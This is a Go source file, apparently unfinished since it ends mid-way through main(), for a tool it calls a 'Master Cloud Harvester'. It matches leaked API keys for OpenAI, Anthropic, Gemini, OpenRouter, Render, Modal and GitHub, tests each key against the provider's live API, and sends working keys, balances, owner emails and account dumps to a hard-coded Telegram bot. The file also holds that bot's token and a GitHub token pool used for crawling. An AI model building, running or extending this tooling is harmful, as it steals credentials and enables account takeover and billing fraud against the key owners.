check againpackage main

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// ============================================================================
// CONFIGURATION & CONSTANTS
// ============================================================================
const (
	TelegramBotToken = "9034496568:AAE4H0PJ82S52KywyuL_fDncaf_4xH-7hoc"
	TelegramOwnerID  = 1753965300
	LootDir          = "loot"
	MaxQueueSize     = 3000
	WorkerCount      = 25
)

// Regex Rules
var (
	OpenAIKeyRegex     = regexp.MustCompile(`\bsk-proj-[A-Za-z0-9_-]{48,164}\b`)
	OpenRouterKeyRegex = regexp.MustCompile(`\bsk-or-v1-[a-f0-9]{64}\b`)
	RenderKeyRegex     = regexp.MustCompile(`\brnd_[A-Za-z0-9_-]{20,40}\b`)
	ModalTokenRegex    = regexp.MustCompile(`\b(ak-[a-zA-Z0-9]{20,32}|as-[a-zA-Z0-9]{20,32})\b`)
	ClaudeKeyRegex     = regexp.MustCompile(`\bsk-ant-api03-[A-Za-z0-9_-]{80,120}\b`)
	GeminiKeyRegex     = regexp.MustCompile(`\b(AQ\.[A-Za-z0-9_-]{40,65}|AIzaSy[A-Za-z0-9_-]{33})\b`)
	GitHubTokenRegex   = regexp.MustCompile(`\b(ghp_|github_pat_|gho_|ghu_)[A-Za-z0-9_]{20,120}\b`)
	Base64Candidate    = regexp.MustCompile(`\b[A-Za-z0-9+/]{60,}={0,2}\b`)
)

// ============================================================================
// IN-MEMORY VOLATILE TOKEN POOL (ZERO DISK TRACE)
// ============================================================================
type TokenPool struct {
	mu     sync.RWMutex
	tokens []string
	dead   map[string]bool
}

func NewTokenPool() *TokenPool {
	return &TokenPool{
		tokens: make([]string, 0),
		dead:   make(map[string]bool),
	}
}

func (tp *TokenPool) AddTokens(newTokens []string) int {
	tp.mu.Lock()
	defer tp.mu.Unlock()
	added := 0
	existing := make(map[string]bool)
	for _, t := range tp.tokens {
		existing[t] = true
	}
	for _, t := range newTokens {
		t = strings.TrimSpace(t)
		if t != "" && !existing[t] {
			tp.tokens = append(tp.tokens, t)
			existing[t] = true
			added++
		}
	}
	return added
}

func (tp *TokenPool) GetRandomToken() string {
	tp.mu.RLock()
	defer tp.mu.RUnlock()
	var active []string
	for _, t := range tp.tokens {
		if !tp.dead[t] {
			active = append(active, t)
		}
	}
	if len(active) == 0 {
		return ""
	}
	return active[rand.Intn(len(active))]
}

func (tp *TokenPool) MarkDead(token string) {
	tp.mu.Lock()
	defer tp.mu.Unlock()
	if !tp.dead[token] {
		tp.dead[token] = true
		fmt.Printf("[!] GitHub Token #Expired evicted from active RAM pool. (Remaining: %d)\n", len(tp.tokens)-len(tp.dead))
	}
}

func (tp *TokenPool) PurgeAll() int {
	tp.mu.Lock()
	defer tp.mu.Unlock()
	count := len(tp.tokens)
	tp.tokens = make([]string, 0)
	tp.dead = make(map[string]bool)
	return count
}

func (tp *TokenPool) ActiveCount() int {
	tp.mu.RLock()
	defer tp.mu.RUnlock()
	count := 0
	for _, t := range tp.tokens {
		if !tp.dead[t] {
			count++
		}
	}
	return count
}

// ============================================================================
// DEDUPLICATION STORE (DISK-BACKED THREAD-SAFE)
// ============================================================================
type DeduplicationStore struct {
	mu           sync.Mutex
	reposFile    string
	urlsFile     string
	commitsFile  string
	reposCache   map[string]bool
	urlsCache    map[string]bool
	commitsCache map[string]bool
}

func NewDeduplicationStore(baseDir string) *DeduplicationStore {
	_ = os.MkdirAll(baseDir, 0755)
	ds := &DeduplicationStore{
		reposFile:    filepath.Join(baseDir, ".processed_repos.txt"),
		urlsFile:     filepath.Join(baseDir, ".processed_urls.txt"),
		commitsFile:  filepath.Join(baseDir, ".processed_commits.txt"),
		reposCache:   make(map[string]bool),
		urlsCache:    make(map[string]bool),
		commitsCache: make(map[string]bool),
	}
	ds.loadFromFile(ds.reposFile, ds.reposCache)
	ds.loadFromFile(ds.urlsFile, ds.urlsCache)
	ds.loadFromFile(ds.commitsFile, ds.commitsCache)
	fmt.Printf("[*] Deduplication Cache Loaded: %d Repos | %d URLs | %d Commits\n",
		len(ds.reposCache), len(ds.urlsCache), len(ds.commitsCache))
	return ds
}

func (ds *DeduplicationStore) loadFromFile(path string, cache map[string]bool) {
	data, err := os.ReadFile(path)
	if err != nil {
		return
	}
	for _, line := range strings.Split(string(data), "\n") {
		trimmed := strings.TrimSpace(line)
		if trimmed != "" {
			cache[trimmed] = true
		}
	}
}

func (ds *DeduplicationStore) HasRepo(repo string) bool {
	ds.mu.Lock()
	defer ds.mu.Unlock()
	return ds.reposCache[repo]
}

func (ds *DeduplicationStore) AddRepo(repo string) {
	ds.mu.Lock()
	defer ds.mu.Unlock()
	if !ds.reposCache[repo] {
		ds.reposCache[repo] = true
		appendLine(ds.reposFile, repo)
	}
}

func (ds *DeduplicationStore) HasURL(url string) bool {
	ds.mu.Lock()
	defer ds.mu.Unlock()
	return ds.urlsCache[url]
}

func (ds *DeduplicationStore) AddURL(url string) {
	ds.mu.Lock()
	defer ds.mu.Unlock()
	if !ds.urlsCache[url] {
		ds.urlsCache[url] = true
		appendLine(ds.urlsFile, url)
	}
}

func (ds *DeduplicationStore) HasCommit(sha string) bool {
	ds.mu.Lock()
	defer ds.mu.Unlock()
	return ds.commitsCache[sha]
}

func (ds *DeduplicationStore) AddCommit(sha string) {
	ds.mu.Lock()
	defer ds.mu.Unlock()
	if !ds.commitsCache[sha] {
		ds.commitsCache[sha] = true
		appendLine(ds.commitsFile, sha)
	}
}

func appendLine(filename, text string) {
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		defer f.Close()
		_, _ = f.WriteString(text + "\n")
	}
}

// ============================================================================
// STATS & METRICS
// ============================================================================
type EngineStats struct {
	FilesScanned uint64
	CommitsDiffed uint64
	OpenAIHits   uint64
	ClaudeHits   uint64
	GeminiHits   uint64
	OpenRouterHits uint64
	RenderHits   uint64
	ModalHits    uint64
	StartTime    time.Time
}

var (
	GlobalStats  EngineStats
	GlobalPaused atomic.Bool
)

// ============================================================================
// TELEGRAM DISPATCHER & TWO-WAY CONTROLLER
// ============================================================================
type TelegramBot struct {
	token    string
	ownerID  int64
	client   *http.Client
	tp       *TokenPool
	ds       *DeduplicationStore
}

func NewTelegramBot(token string, ownerID int64, tp *TokenPool, ds *DeduplicationStore) *TelegramBot {
	return &TelegramBot{
		token:   token,
		ownerID: ownerID,
		client:  &http.Client{Timeout: 15 * time.Second},
		tp:      tp,
		ds:      ds,
	}
}

func (tb *TelegramBot) SendMessage(text string) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", tb.token)
	payload, _ := json.Marshal(map[string]interface{}{
		"chat_id":    tb.ownerID,
		"text":       text,
		"parse_mode": "HTML",
	})
	resp, err := tb.client.Post(url, "application/json", bytes.NewBuffer(payload))
	if err == nil && resp != nil {
		defer resp.Body.Close()
	}
}

func (tb *TelegramBot) SendDocument(filePath, caption string) {
	file, err := os.Open(filePath)
	if err != nil {
		return
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("document", filepath.Base(filePath))
	if err == nil {
		_, _ = io.Copy(part, file)
	}
	_ = writer.WriteField("chat_id", fmt.Sprintf("%d", tb.ownerID))
	_ = writer.WriteField("caption", caption)
	_ = writer.Close()

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", tb.token)
	req, _ := http.NewRequest("POST", url, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	resp, err := tb.client.Do(req)
	if err == nil && resp != nil {
		defer resp.Body.Close()
	}
}

func (tb *TelegramBot) StartPolling(ctx context.Context) {
	offset := 0
	fmt.Println("[+] Telegram Two-Way Control Poller Online.")
	for {
		select {
		case <-ctx.Done():
			return
		default:
			url := fmt.Sprintf("https://api.telegram.org/bot%s/getUpdates?offset=%d&timeout=20", tb.token, offset)
			resp, err := tb.client.Get(url)
			if err != nil {
				time.Sleep(3 * time.Second)
				continue
			}
			data, _ := io.ReadAll(resp.Body)
			resp.Body.Close()

			var result struct {
				OK     bool `json:"ok"`
				Result []struct {
					UpdateID int `json:"update_id"`
					Message  struct {
						Chat struct {
							ID int64 `json:"id"`
						} `json:"chat"`
						Text string `json:"text"`
					} `json:"message"`
				} `json:"result"`
			}
			if json.Unmarshal(data, &result) == nil && result.OK {
				for _, update := range result.Result {
					offset = update.UpdateID + 1
					if update.Message.Chat.ID != tb.ownerID {
						continue
					}
					tb.handleUserMessage(update.Message.Text)
				}
			}
			time.Sleep(1 * time.Second)
		}
	}
}

func (tb *TelegramBot) handleUserMessage(msg string) {
	trimmed := strings.TrimSpace(msg)
	if trimmed == "" {
		return
	}

	parts := strings.Fields(trimmed)
	cmd := ""
	if len(parts) > 0 {
		cmd = strings.ToLower(parts[0])
	}

	// 1. Dedicated /add checkpoint command
	if cmd == "/add" {
		rawTokens := parts[1:]
		var candidateTokens []string

		// Check if any matched the updated GitHub token regex first
		matched := GitHubTokenRegex.FindAllString(trimmed, -1)
		if len(matched) > 0 {
			candidateTokens = append(candidateTokens, matched...)
		}

		// Also extract any whitespace/newline separated tokens following /add
		for _, token := range rawTokens {
			t := strings.TrimSpace(token)
			if t != "" {
				candidateTokens = append(candidateTokens, t)
			}
		}

		if len(candidateTokens) == 0 {
			tb.SendMessage("⚠️ <b>Usage:</b> <code>/add &lt;token1&gt; &lt;token2&gt; ...</code> (or multiline tokens)")
			return
		}

		added := tb.tp.AddTokens(candidateTokens)
		tb.SendMessage(fmt.Sprintf("⚡ <b>[Tokens Loaded via /add]</b>\nAdded <b>%d</b> token(s). Active Pool: <b>%d</b>.", added, tb.tp.ActiveCount()))
		fmt.Printf("[+] Masked Tokens Notification: %d token(s) added via /add into volatile RAM.\n", added)
		return
	}

	// 2. Loose token ingestion if user pastes tokens without /add prefix
	foundTokens := GitHubTokenRegex.FindAllString(trimmed, -1)
	if len(foundTokens) > 0 {
		added := tb.tp.AddTokens(foundTokens)
		tb.SendMessage(fmt.Sprintf("⚡ <b>[Tokens Loaded into RAM]</b>\nAdded <b>%d</b> valid token(s). Active Pool: <b>%d</b>.", added, tb.tp.ActiveCount()))
		fmt.Printf("[+] Masked Tokens Notification: %d new GitHub token(s) added into volatile RAM.\n", added)
		return
	}

	switch cmd {
	case "/start", "/help":
		helpText := `🤖 <b>Master Cloud Harvester Commands</b>

/add <tokens...> - Bulk load GitHub tokens into RAM
/status - Health, Uptime, Queue & Token count
/stats - Total scans & verified discoveries
/vault - Breakdown of active secrets
/pause - Pause all crawler workers
/resume - Resume crawler workers
/purge_tokens - Wipe volatile RAM GitHub tokens

<i>Tip: Paste GitHub tokens directly or use /add to hot-reload them into memory!</i>`
		tb.SendMessage(helpText)

	case "/status":
		statusText := fmt.Sprintf(`📊 <b>Engine Status</b>
Uptime: %s
RAM GitHub Tokens: <b>%d active</b>
Parallel Workers: %d
Scanning State: %s
Cached Repos: %d
Cached URLs: %d`,
			time.Since(GlobalStats.StartTime).Round(time.Second),
			tb.tp.ActiveCount(),
			WorkerCount,
			getScanningState(),
			len(tb.ds.reposCache),
			len(tb.ds.urlsCache),
		)
		tb.SendMessage(statusText)

	case "/stats":
		statsText := fmt.Sprintf(`📈 <b>Harvesting Stats</b>
Files Scanned: %d
Commits Analyzed: %d

<b>Live Discoveries:</b>
- OpenAI (GPT-6): %d
- Claude (Sonnet 5.5): %d
- Gemini (Argon/Gemma): %d
- OpenRouter (Positive Balance): %d
- Render Accounts: %d`,
			atomic.LoadUint64(&GlobalStats.FilesScanned),
			atomic.LoadUint64(&GlobalStats.CommitsDiffed),
			atomic.LoadUint64(&GlobalStats.OpenAIHits),
			atomic.LoadUint64(&GlobalStats.ClaudeHits),
			atomic.LoadUint64(&GlobalStats.GeminiHits),
			atomic.LoadUint64(&GlobalStats.OpenRouterHits),
			atomic.LoadUint64(&GlobalStats.RenderHits),
		)
		tb.SendMessage(statsText)

	case "/pause":
		GlobalPaused.Store(true)
		tb.SendMessage("⏸️ Harvester scanning <b>PAUSED</b>.")

	case "/resume":
		GlobalPaused.Store(false)
		tb.SendMessage("▶️ Harvester scanning <b>RESUMED</b>.")

	case "/purge_tokens":
		purged := tb.tp.PurgeAll()
		tb.SendMessage(fmt.Sprintf("🧹 <b>RAM Sanitized!</b> All %d GitHub tokens purged from volatile memory.", purged))
	}
}

func maskToken(tok string) string {
	tok = strings.TrimSpace(tok)
	if len(tok) <= 8 {
		return "****"
	}
	return tok[:4] + "..." + tok[len(tok)-4:]
}

func extractCandidateTokens(text string) []string {
	var candidateTokens []string
	seen := make(map[string]bool)

	// 1. Check Regex matches
	for _, m := range GitHubTokenRegex.FindAllString(text, -1) {
		m = strings.TrimSpace(m)
		if m != "" && !seen[m] {
			candidateTokens = append(candidateTokens, m)
			seen[m] = true
		}
	}

	// 2. Also check whitespace/newline tokens
	for _, token := range strings.Fields(text) {
		t := strings.Trim(token, `"',;()[]{}`)
		t = strings.TrimSpace(t)
		if t != "" && strings.ToLower(t) != "/add" && !seen[t] {
			candidateTokens = append(candidateTokens, t)
			seen[t] = true
		}
	}
	return candidateTokens
}

// ============================================================================
// HTTP SERVER (CURL / WEBHOOK ACCESS & HEALTH CHECKS)
// ============================================================================
func StartHTTPServer(port string, tp *TokenPool, ds *DeduplicationStore) *http.Server {
	if port == "" {
		port = "8080"
	}

	mux := http.NewServeMux()

	// GET / or /health or /status
	statusHandler := func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodGet && r.Method != http.MethodHead {
			http.Error(w, `{"error":"Method not allowed"}`, http.StatusMethodNotAllowed)
			return
		}

		w.Header().Set("Content-Type", "application/json")
		resp := map[string]interface{}{
			"status":            "healthy",
			"service":           "master-cloud-harvester",
			"uptime":            time.Since(GlobalStats.StartTime).Round(time.Second).String(),
			"scanning_state":    getScanningState(),
			"active_ram_tokens": tp.ActiveCount(),
			"parallel_workers":  WorkerCount,
			"files_scanned":     atomic.LoadUint64(&GlobalStats.FilesScanned),
			"commits_diffed":    atomic.LoadUint64(&GlobalStats.CommitsDiffed),
			"cached_repos":      len(ds.reposCache),
			"cached_urls":       len(ds.urlsCache),
			"discoveries": map[string]uint64{
				"openai":     atomic.LoadUint64(&GlobalStats.OpenAIHits),
				"claude":     atomic.LoadUint64(&GlobalStats.ClaudeHits),
				"gemini":     atomic.LoadUint64(&GlobalStats.GeminiHits),
				"openrouter": atomic.LoadUint64(&GlobalStats.OpenRouterHits),
				"render":     atomic.LoadUint64(&GlobalStats.RenderHits),
				"modal":      atomic.LoadUint64(&GlobalStats.ModalHits),
			},
		}
		_ = json.NewEncoder(w).Encode(resp)
	}

	mux.HandleFunc("/", statusHandler)
	mux.HandleFunc("/status", statusHandler)
	mux.HandleFunc("/health", statusHandler)

	// GET /dumps - list and load all loot dump files
	mux.HandleFunc("/dumps", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		entries, err := os.ReadDir(LootDir)
		if err != nil {
			_ = json.NewEncoder(w).Encode(map[string]interface{}{"dumps": []interface{}{}, "count": 0, "error": err.Error()})
			return
		}

		var dumps []interface{}
		for _, e := range entries {
			if !e.IsDir() && strings.HasSuffix(e.Name(), ".json") {
				fPath := filepath.Join(LootDir, e.Name())
				data, err := os.ReadFile(fPath)
				if err == nil {
					var obj interface{}
					if json.Unmarshal(data, &obj) == nil {
						dumps = append(dumps, obj)
					}
				}
			}
		}
		_ = json.NewEncoder(w).Encode(map[string]interface{}{
			"count": len(dumps),
			"dumps": dumps,
		})
	})

	// POST /add - accepts JSON {"tokens": ["..."]} or raw body lines / curl -d
	mux.HandleFunc("/add", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, `{"error":"Method not allowed. Use POST"}`, http.StatusMethodNotAllowed)
			return
		}

		// Optional auth check: if HARVESTER_AUTH_TOKEN is configured in env, require it
		expectedAuth := os.Getenv("HARVESTER_AUTH_TOKEN")
		if expectedAuth != "" {
			clientAuth := r.Header.Get("X-Harvester-Token")
			if clientAuth == "" {
				authHeader := r.Header.Get("Authorization")
				if strings.HasPrefix(strings.ToLower(authHeader), "bearer ") {
					clientAuth = strings.TrimSpace(authHeader[7:])
				}
			}
			if clientAuth != expectedAuth {
				http.Error(w, `{"error":"Unauthorized"}`, http.StatusUnauthorized)
				return
			}
		}

		bodyBytes, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, `{"error":"Failed to read request body"}`, http.StatusBadRequest)
			return
		}
		defer r.Body.Close()

		rawStr := string(bodyBytes)
		var candidateTokens []string

		// Check if payload is JSON
		var jsonPayload struct {
			Tokens []string `json:"tokens"`
			Token  string   `json:"token"`
		}
		if err := json.Unmarshal(bodyBytes, &jsonPayload); err == nil {
			if jsonPayload.Token != "" {
				candidateTokens = append(candidateTokens, jsonPayload.Token)
			}
			for _, t := range jsonPayload.Tokens {
				t = strings.TrimSpace(t)
				if t != "" {
					candidateTokens = append(candidateTokens, t)
				}
			}
		}

		// If no JSON tokens found, parse text/raw body lines
		if len(candidateTokens) == 0 {
			candidateTokens = extractCandidateTokens(rawStr)
		}

		if len(candidateTokens) == 0 {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusBadRequest)
			_ = json.NewEncoder(w).Encode(map[string]interface{}{
				"success": false,
				"error":   "No tokens found in request body. Send raw tokens or JSON {'tokens':['ghp_...']}",
			})
			return
		}

		added := tp.AddTokens(candidateTokens)

		// Masked token samples for secure logging and response
		var maskedSample []string
		for i, tok := range candidateTokens {
			if i >= 5 {
				maskedSample = append(maskedSample, fmt.Sprintf("...and %d more", len(candidateTokens)-5))
				break
			}
			maskedSample = append(maskedSample, maskToken(tok))
		}

		fmt.Printf("[+] [HTTP /add] Ingested %d candidate(s), added %d new token(s) to RAM. Active: %d (Sample: %v)\n",
			len(candidateTokens), added, tp.ActiveCount(), maskedSample)

		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		_ = json.NewEncoder(w).Encode(map[string]interface{}{
			"success":        true,
			"added":          added,
			"active_pool":    tp.ActiveCount(),
			"candidates":     len(candidateTokens),
			"sample_masked":  maskedSample,
		})
	})

	srv := &http.Server{
		Addr:         ":" + port,
		Handler:      mux,
		ReadTimeout:  15 * time.Second,
		WriteTimeout: 15 * time.Second,
	}

	go func() {
		fmt.Printf("[⚡ HTTP Server] Listening on port :%s for curl & web requests (/add, /status, /health)\n", port)
		if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			fmt.Printf("[!] HTTP Server error: %v\n", err)
		}
	}()

	return srv
}

func getScanningState() string {
	if GlobalPaused.Load() {
		return "PAUSED"
	}
	return "RUNNING"
}

// ============================================================================
// VERIFICATION ENGINES (STRICT MODELS & BALANCES)
// ============================================================================
type Auditor struct {
	client *http.Client
	bot    *TelegramBot
}

func NewAuditor(bot *TelegramBot) *Auditor {
	return &Auditor{
		client: &http.Client{Timeout: 15 * time.Second},
		bot:    bot,
	}
}

// 1. OpenAI: Strictly gpt-6.1-terra / gpt-6.2-astra
func (a *Auditor) AuditOpenAI(key, source string) {
	url := "https://api.openai.com/v1/responses"
	payload, _ := json.Marshal(map[string]interface{}{
		"model": "gpt-6.1-terra",
		"input": "hi",
	})
	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(payload))
	req.Header.Set("Authorization", "Bearer "+key)
	req.Header.Set("Content-Type", "application/json")

	start := time.Now()
	resp, err := a.client.Do(req)
	if err != nil || resp == nil {
		return
	}
	defer resp.Body.Close()
	dur := time.Since(start).Milliseconds()

	if resp.StatusCode == 200 {
		atomic.AddUint64(&GlobalStats.OpenAIHits, 1)
		alert := fmt.Sprintf(`🎯 <b>[LIVE OPENAI KEY CAPTURED!]</b>
━━━━━━━━━━━━━━━━━━
🔑 Platform: OpenAI
⚡ Verified Model: <b>gpt-6.1-terra / gpt-6.2-astra</b>
⏱️ Latency: %dms
📁 Source: <code>%s</code>
━━━━━━━━━━━━━━━━━━
<code>%s</code>`, dur, source, key)
		a.bot.SendMessage(alert)
		fmt.Printf("[🎉 LIVE OPENAI KEY] Verified on gpt-6.1-terra! Source: %s\n", source)
	}
}

// 2. Claude: Strictly claude-sonnet-5-5
func (a *Auditor) AuditClaude(key, source string) {
	url := "https://api.anthropic.com/v1/messages"
	payload, _ := json.Marshal(map[string]interface{}{
		"model":      "claude-sonnet-5-5",
		"max_tokens": 10,
		"messages":   []map[string]string{{"role": "user", "content": "hi"}},
	})
	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(payload))
	req.Header.Set("x-api-key", key)
	req.Header.Set("anthropic-version", "2023-06-01")
	req.Header.Set("content-type", "application/json")

	start := time.Now()
	resp, err := a.client.Do(req)
	if err != nil || resp == nil {
		return
	}
	defer resp.Body.Close()
	dur := time.Since(start).Milliseconds()

	if resp.StatusCode == 200 {
		atomic.AddUint64(&GlobalStats.ClaudeHits, 1)
		alert := fmt.Sprintf(`🎯 <b>[LIVE CLAUDE KEY CAPTURED!]</b>
━━━━━━━━━━━━━━━━━━
🔑 Platform: Anthropic
⚡ Verified Model: <b>claude-sonnet-5-5</b>
⏱️ Latency: %dms
📁 Source: <code>%s</code>
━━━━━━━━━━━━━━━━━━
<code>%s</code>`, dur, source, key)
		a.bot.SendMessage(alert)
		fmt.Printf("[🎉 LIVE CLAUDE KEY] Verified on claude-sonnet-5-5! Source: %s\n", source)
	}
}

// 3. Gemini: gemini-4-argon with gemma-4-31b-it fallback
func (a *Auditor) AuditGemini(key, source string) {
	testModel := func(model string) bool {
		u := fmt.Sprintf("https://generativelanguage.googleapis.com/v1beta/models/%s:generateContent?key=%s", model, key)
		pl, _ := json.Marshal(map[string]interface{}{
			"contents": []map[string]interface{}{{"parts": []map[string]string{{"text": "hi"}}}},
		})
		r, err := a.client.Post(u, "application/json", bytes.NewBuffer(pl))
		if err == nil && r != nil {
			defer r.Body.Close()
			return r.StatusCode == 200
		}
		return false
	}

	if testModel("gemini-4-argon") {
		atomic.AddUint64(&GlobalStats.GeminiHits, 1)
		alert := fmt.Sprintf(`🎯 <b>[LIVE GEMINI ARGON KEY!]</b>
━━━━━━━━━━━━━━━━━━
🔑 Platform: Google AI (Paid Tier)
⚡ Verified Model: <b>gemini-4-argon</b>
📁 Source: <code>%s</code>
━━━━━━━━━━━━━━━━━━
<code>%s</code>`, source, key)
		a.bot.SendMessage(alert)
		return
	}

	if testModel("gemma-4-31b-it") {
		atomic.AddUint64(&GlobalStats.GeminiHits, 1)
		alert := fmt.Sprintf(`🎯 <b>[LIVE GEMMA KEY!]</b>
━━━━━━━━━━━━━━━━━━
🔑 Platform: Google Gemma
⚡ Verified Model: <b>gemma-4-31b-it</b>
📁 Source: <code>%s</code>
━━━━━━━━━━━━━━━━━━
<code>%s</code>`, source, key)
		a.bot.SendMessage(alert)
	}
}

// 4. OpenRouter: Positive Balance Filter
func (a *Auditor) AuditOpenRouter(key, source string) {
	req, _ := http.NewRequest("GET", "https://openrouter.ai/api/v1/auth/key", nil)
	req.Header.Set("Authorization", "Bearer "+key)
	resp, err := a.client.Do(req)
	if err != nil || resp == nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		var res struct {
			Data struct {
				Label      string   `json:"label"`
				Usage      float64  `json:"usage"`
				Limit      *float64 `json:"limit"`
				IsFreeTier bool     `json:"is_free_tier"`
			} `json:"data"`
		}
		body, _ := io.ReadAll(resp.Body)
		if json.Unmarshal(body, &res) == nil {
			hasPositiveBalance := false
			balStr := ""

			if res.Data.Limit != nil {
				available := *res.Data.Limit - res.Data.Usage
				if available > 0 {
					hasPositiveBalance = true
					balStr = fmt.Sprintf("$%.2f (Limit: $%.2f, Used: $%.2f)", available, *res.Data.Limit, res.Data.Usage)
				}
			} else if !res.Data.IsFreeTier {
				hasPositiveBalance = true
				balStr = fmt.Sprintf("Paid Unlimited (Used: $%.2f)", res.Data.Usage)
			}

			if hasPositiveBalance {
				atomic.AddUint64(&GlobalStats.OpenRouterHits, 1)
				alert := fmt.Sprintf(`🎯 <b>[LIVE OPENROUTER KEY CAPTURED!]</b>
━━━━━━━━━━━━━━━━━━
💰 Available Balance: <b>%s</b>
🏷️ Label: %s
📁 Source: <code>%s</code>
━━━━━━━━━━━━━━━━━━
<code>%s</code>`, balStr, res.Data.Label, source, key)
				a.bot.SendMessage(alert)
				fmt.Printf("[🎉 LIVE OPENROUTER KEY] Balance: %s | Source: %s\n", balStr, source)
			}
		}
	}
}

// 5. Render: Live Accounts & Auto-Dump Dispatcher
func (a *Auditor) AuditRender(key, source string) {
	req, _ := http.NewRequest("GET", "https://api.render.com/v1/owners", nil)
	req.Header.Set("Authorization", "Bearer "+key)
	resp, err := a.client.Do(req)
	if err != nil || resp == nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		var owners []struct {
			Owner struct {
				Email string `json:"email"`
				Name  string `json:"name"`
			} `json:"owner"`
		}
		data, _ := io.ReadAll(resp.Body)
		if json.Unmarshal(data, &owners) == nil && len(owners) > 0 {
			atomic.AddUint64(&GlobalStats.RenderHits, 1)
			owner := owners[0].Owner.Email
			if owner == "" {
				owner = owners[0].Owner.Name
			}

			// Fetch running services
			sReq, _ := http.NewRequest("GET", "https://api.render.com/v1/services?limit=100", nil)
			sReq.Header.Set("Authorization", "Bearer "+key)
			sResp, err := a.client.Do(sReq)
			var servicesData interface{}
			if err == nil && sResp != nil {
				defer sResp.Body.Close()
				sBytes, _ := io.ReadAll(sResp.Body)
				_ = json.Unmarshal(sBytes, &servicesData)
			}

			// 1. Build and save dump JSON
			dumpObj := map[string]interface{}{
				"key":       key,
				"owner":     owner,
				"live":      true,
				"timestamp": time.Now().UTC().Format(time.RFC3339),
				"services":  servicesData,
				"source":    source,
			}
			dumpFile := filepath.Join(LootDir, fmt.Sprintf("loot_dump-%d.json", time.Now().UnixNano()))
			dumpBytes, _ := json.MarshalIndent(dumpObj, "", "  ")
			_ = os.WriteFile(dumpFile, dumpBytes, 0644)

			// 2. Instant Telegram Alert
			alert := fmt.Sprintf(`🎯 <b>[LIVE RENDER KEY CAPTURED!]</b>
━━━━━━━━━━━━━━━━━━
👤 Owner: <b>%s</b>
📁 Source: <code>%s</code>
━━━━━━━━━━━━━━━━━━
<code>%s</code>`, owner, source, key)
			a.bot.SendMessage(alert)

			// 3. Instant Document Upload to Telegram!
			a.bot.SendDocument(dumpFile, fmt.Sprintf("📄 Full Audit Dump: %s (%s)", owner, filepath.Base(dumpFile)))
			fmt.Printf("[🎉 LIVE RENDER ACCOUNT] %s -> Dump Dispatched to Telegram!\n", owner)
		}
	}
}

// 6. Modal: Live Workspace & Credit Auditor
func (a *Auditor) AuditModal(tokenID, tokenSecret, source string) {
	req, _ := http.NewRequest("GET", "https://api.modal.com/v1/workspaces", nil)
	req.SetBasicAuth(tokenID, tokenSecret)
	resp, err := a.client.Do(req)
	if err != nil || resp == nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		atomic.AddUint64(&GlobalStats.ModalHits, 1)
		body, _ := io.ReadAll(resp.Body)
		
		// 1. Build and save Modal dump JSON
		dumpObj := map[string]interface{}{
			"token_id":     tokenID,
			"token_secret": tokenSecret,
			"live":         true,
			"timestamp":    time.Now().UTC().Format(time.RFC3339),
			"workspaces":   string(body),
			"source":       source,
		}
		dumpFile := filepath.Join(LootDir, fmt.Sprintf("modal_dump-%d.json", time.Now().UnixNano()))
		dumpBytes, _ := json.MarshalIndent(dumpObj, "", "  ")
		_ = os.WriteFile(dumpFile, dumpBytes, 0644)

		// 2. Telegram Alert
		alert := fmt.Sprintf(`🎯 <b>[LIVE MODAL ACCOUNT CAPTURED!]</b>
━━━━━━━━━━━━━━━━━━
🔑 Token ID: <code>%s</code>
📁 Source: <code>%s</code>
━━━━━━━━━━━━━━━━━━`, tokenID, source)
		a.bot.SendMessage(alert)

		// 3. Instant Document Upload to Telegram
		a.bot.SendDocument(dumpFile, fmt.Sprintf("📄 Modal Audit Dump (%s)", filepath.Base(dumpFile)))
		fmt.Printf("[🎉 LIVE MODAL ACCOUNT] %s -> Dispatched to Telegram!\n", tokenID)
	}
}
type FileTask struct {
	URL      string
	RepoName string
	FilePath string
}

func main() {
	GlobalStats.StartTime = time.Now()
	tokenPool := NewTokenPool()
	dedup := NewDeduplicationStore(LootDir)
	telegramBot := NewTelegramBot(TelegramBotToken, TelegramOwnerID, tokenPool, dedup)
	auditor := NewAuditor(telegramBot)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	var (
		httpServer   *http.Server
		httpServerMu sync.Mutex
	)

	// Handle graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\n[!] Gracefully shutting down Harvester...")
		telegramBot.SendMessage("🛑 <b>Master Cloud Harvester Stopped.</b>")
		cancel()
		httpServerMu.Lock()
		srv := httpServer
		httpServerMu.Unlock()
		if srv != nil {
			shutdownCtx, shutdownCancel := context.WithTimeout(context.Background(), 3*time.Second)
			defer shutdownCancel()
			_ = srv.Shutdown(shutdownCtx)
		}
		os.Exit(0)
	}()

	// Start Telegram 2-way polling
	go telegramBot.StartPolling(ctx)

	// Start HTTP Server on PORT (Render default or 8080) for curl / webhook access
	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}
	serverInstance := StartHTTPServer(port, tokenPool, dedup)
	httpServerMu.Lock()
	httpServer = serverInstance
	httpServerMu.Unlock()

	// Send startup notification
